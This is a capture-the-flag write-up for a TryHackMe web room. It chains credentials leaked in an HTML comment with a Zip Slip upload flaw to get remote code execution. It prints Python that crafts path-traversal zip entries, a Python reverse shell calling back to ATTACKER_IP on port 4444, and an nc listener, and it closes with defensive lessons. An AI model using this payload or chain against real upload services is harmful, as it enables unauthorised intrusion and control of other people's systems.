# Day 10 - The Hollow Shell

- **Room:** [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)
- **Category:** Web / Zip Slip
- **Difficulty:** Medium (90 points)
- **Date completed:** 5th of August 2026

## Summary

Byte Lotus lets staff "upload a shell" (a `.zip` souvenir pack) through the Shoreline Display portal to set ambiance on in-room tablets. The portal extracted uploaded zip archives without validating entry paths, allowing a classic Zip Slip attack. Combined with an "automation hooks" feature that auto-executes scripts dropped into a `hooks/` directory, this turned into full remote code execution as the `roomservice` user.

## Exploitation

### Step 1 - Recon

Nmap against the target showed only two open ports:

```
nmap -sC -sV -p- 10.128.153.149
```

Port 22 (SSH) and port 5000, running a Python/Flask app behind gunicorn, redirecting to `/login`.

### Step 2 - Leaked staff credentials

Viewing the page source of the login page (`Ctrl+U`) revealed an HTML comment with seeded default staff credentials:

```
user: concierge
pass: StayNoticed2024!
```

Logged in as `concierge` and landed on the "Room Service / Shoreline Display" dashboard - a "Bring a shell ashore" feature to upload a `.zip` containing a `shell.json` manifest.

### Step 3 - Confirming the Zip Slip

A baseline upload (a minimal `shell.json`) worked fine and got extracted to `shells/<id>/`, directly browsable over HTTP. To test whether the extraction validated entry paths, a zip was crafted with a manipulated entry name using Python's `zipfile`:

```python
import zipfile
with zipfile.ZipFile("test.zip", "a") as z:
    z.writestr("../../../../tmp/pwned_test.txt", "zip slip works")
```

The upload succeeded silently, with no rejection of the malicious path - confirming the server extracts zip entries without sanitizing `../` sequences (Zip Slip / arbitrary file write).

### Step 4 - Weaponizing the write into RCE

The portal's own hint text ("a shell may include optional automation hooks - the theme worker applies these for you shortly after the shell comes ashore") pointed to a `hooks/` directory at the app root that gets auto-executed. Using the same Zip Slip technique, a Python reverse shell was written straight into that directory instead of a scratch file:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

### Step 5 - Catching the shell

A listener was started on the attack box:

```
nc -lvnp 4444
```

The crafted `reverse-shell.zip` was uploaded through the portal. Shortly after, the theme worker picked up and executed the planted hook, and a connection came back:

```
roomservice@tryhackme-2404:/var/www/conch$
```

Full code execution as `roomservice`, confirming the chain: Zip Slip -> arbitrary file write into `hooks/` -> automatic hook execution -> RCE.

### Step 6 - Finding the flag

With shell access as `roomservice`, the flag was located directly in the `roomservice` working directory - no further privilege escalation was needed.

And voila, there you have it!

## Flag

![REDACTED](https://img.shields.io/badge/flag-REDACTED-black)

The correct flag will be posted after the event concludes, to avoid spoilers.

## Lessons Learned

- Zip extraction on the server side must always validate that resolved paths stay inside the intended destination folder - never trust filenames stored inside an archive.
- "Convenience" automation features (auto-running anything dropped into a watched directory) are extremely dangerous if that directory can be reached by any kind of file-write primitive, even an indirect one like archive extraction.
- Leaving default/seed credentials in HTML comments is a soft but real finding on its own - it shouldn't be the only door in, but it's still a gift to an attacker.
